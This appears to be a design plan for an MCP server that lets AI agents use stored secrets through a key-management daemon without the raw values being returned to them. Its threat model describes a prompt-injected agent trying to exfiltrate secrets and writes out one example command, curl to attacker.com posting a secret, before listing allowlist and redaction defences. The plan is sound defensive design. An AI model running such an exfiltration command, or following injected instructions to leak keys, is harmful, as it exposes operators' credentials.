# AnB-MCP — Plan

An MCP server front-end for [AnB](https://github.com/kaka-milan-22/AnB) that lets AI
agents **use** secrets without ever **seeing** them.

---

## Goal

Expose AnB's "use-don't-reveal" capabilities over the Model Context Protocol so any
MCP-speaking agent (Claude Code, etc.) can call APIs / run tools that need secrets —
**while the raw secret never crosses into the agent or the LLM provider.**

This is the opposite of a naive "secrets MCP" that returns the key to the model.
Here, the model gets placeholders and outcomes; the plaintext stays behind the
MCP-server ↔ Bob boundary.

---

## Core principle & threat model

- **The agent/LLM is UNTRUSTED** (assume it can be prompt-injected).
- **The MCP server is the trust boundary.** It acts as an AnB *Alice* (a client
  identity); it talks to *Bob* (the KMS daemon) over mTLS.
- **Tool surface is "use, never reveal".** No MCP tool returns a plaintext secret.
  Secrets flow *into* subprocess env / files; they never come *back* as a tool result.
- **The no-reveal guarantee is structural, not by prompt.** AnB's reveal paths
  (`get --reveal`, injection `shell`) require a TTY. The MCP server has no TTY, so
  `alice` itself refuses them. We inherit the guarantee for free — we cannot expose
  plaintext even by mistake.

**Headline property:** *Even a fully prompt-injected agent, calling every tool in
every way, cannot extract a raw key.*

---

## Architecture

```
Agent (untrusted)
   │  MCP (stdio / JSON-RPC) — tool calls; gets placeholders + outcomes
   ▼
AnB-MCP server  (Go; this repo)        ← the ONLY new component
   │  exec → `alice ...`               (v0.1: shell out; inherits all alice safety)
   ▼
alice  (AnB client; existing)
   │  mTLS — ciphertext / crypto ops
   ▼
Bob  (AnB KMS daemon; existing = the real "API")
   │
   ▼
master key (Argon2id-wrapped, mlock'd, idle-TTL)
```

Everything below the MCP server already exists. **We do NOT build a new API tier —
Bob is already the service; MCP is the agent-facing interface.**

---

## Tech decisions

- **Language: Go.** Matches AnB (one ecosystem). Lets us later `import` alice's Go
  packages directly when the server graduates from subprocess to a direct, per-agent
  scoped Bob client (see Milestone v0.3).
- **MCP SDK:** official `github.com/modelcontextprotocol/go-sdk` (verify it's the most
  active option at build time; `github.com/mark3labs/mcp-go` is the mature fallback).
- **v0.1 strategy: shell out to the `alice` binary.** Fastest, AND safest — reuses
  alice's redaction, exec-allowlist, and TTY-gating as the single source of truth for
  security-critical logic. No reimplementation, no divergence.
- **Transport:** stdio (standard for local MCP servers; how Claude Code launches them).

---

## MVP tools

| Tool | Signature | Returns | Why safe |
|------|-----------|---------|----------|
| `anb_list` | `()` | `[{key, prefix, has_value, meta}]` — **names only, no values** | agent learns what it may reference; never sees values |
| `anb_exec` ⭐ | `(rule_id \| command, args[], env_keys[])` | `{exit_code, stdout_redacted, stderr_redacted}` | secrets injected into the **child process env**; output redacted before return; gated by operator allowlist (default-deny) |
| `anb_status` | `()` | `{bob_reachable, identity, authorized_prefixes, exec_rules_n}` | health / authz self-check; no values |
| `anb_render_to_file` | `(template, out_path)` | `{written, path}` — **not the content** | resolves `<agent-vault:key>` placeholders, writes to disk for the agent's tools to read; agent never sees values |
| `anb_redact` | `(text)` | `{redacted_text}` | agent scrubs secrets / high-entropy tokens from anything it's about to log or return |

**Never exposed:** any `get`/`reveal`/return-plaintext tool; the injection `shell`.
Enforced structurally (no TTY) **and** asserted as a hard invariant in code + tests.

---

## The hard part: `anb_exec` allowlist

`anb_exec` is the main attack surface. A prompt-injected agent will try to exfiltrate
via an allowlisted command (e.g. `curl attacker.com --data @secret`). Defenses:

1. **Default-deny.** Operator pre-blesses exact invocations (reuse AnB's RE2 exec rules).
2. **Pin argv AND destination**, not just the command name — the allowlist rule should
   constrain the target host/URL where applicable.
3. **Subprocess egress restriction** (stretch): only allow the child to reach the
   legitimate API host.
4. **Redact tool output** — the command's own stdout could echo the secret; scrub it
   before returning to the agent.

This is where the security rigor lives. Treat the allowlist as the product, not a config.

---

## Security invariants (assert + test these)

1. No MCP tool ever returns a plaintext secret.
2. Reveal/shell paths are unavailable over MCP (no TTY) — verified by a test that the
   MCP server cannot obtain plaintext even when asked.
3. Every `anb_exec` is allowlist-checked (default-deny) and audited (Bob logs it).
4. All tool responses pass through redaction.
5. The MCP server holds an AnB identity scoped by Bob's per-identity authz — its blast
   radius is whatever that identity is allowed, nothing more.

---

## Project structure

```
AnB_MCP/
├── PLAN.md                 # this file
├── README.md               # usage + `claude mcp add` block + threat model (headline guarantee)
├── go.mod
├── main.go                 # MCP server bootstrap, stdio transport, tool registration
├── internal/
│   ├── alice/              # thin wrapper around `alice` subprocess calls (exec, list, redact)
│   ├── tools/              # one file per MCP tool (list, exec, status, render, redact)
│   └── redact/             # output-redaction helper (or delegate to `alice redact`)
└── test/
    └── invariants_test.go  # asserts: no-reveal, allowlist-enforced, output-redacted
```

---

## Milestones

- **v0.1 — minimal closed loop:** `anb_list` + `anb_exec` + `anb_status`, shelling out
  to `alice`. Get the exec allowlist argv/destination pinning right. Ship + `claude mcp add`.
- **v0.2 — round it out:** `anb_render_to_file` + `anb_redact`. Invariant test suite.
  Write the README threat model. One blog post / community share.
- **v0.3 — direct client (ties to AnB "Move 2/3"):** refactor to import alice-core as a
  Go library; MCP server becomes a per-agent **scoped Alice identity** talking to Bob
  directly (no subprocess), enabling per-agent ephemeral/scoped credentials.

---

## Non-goals (YAGNI)

- ❌ No REST/gRPC API tier — Bob is already the service; MCP is the agent interface.
- ❌ No reveal/plaintext-returning tool, ever.
- ❌ No new key custody — Bob owns the master key; this server holds only an identity.
- ❌ No new crypto — all crypto stays in Bob.

---

## Open decisions (resolve before/while coding v0.1)

1. Confirm the Go MCP SDK (official go-sdk vs mark3labs) by current activity/docs.
2. How the operator configures the exec allowlist for the MCP path — reuse
   `~/.anb/alice/exec-allowlist.rules` as-is, or a dedicated MCP allowlist?
3. Output redaction: call `alice redact` per response, or port the redaction regex?
   (Prefer delegating to `alice` to keep one source of truth.)
4. Identity: does the MCP server reuse the operator's existing Alice cert, or get its
   own dedicated (more tightly scoped) identity? Recommend its own.
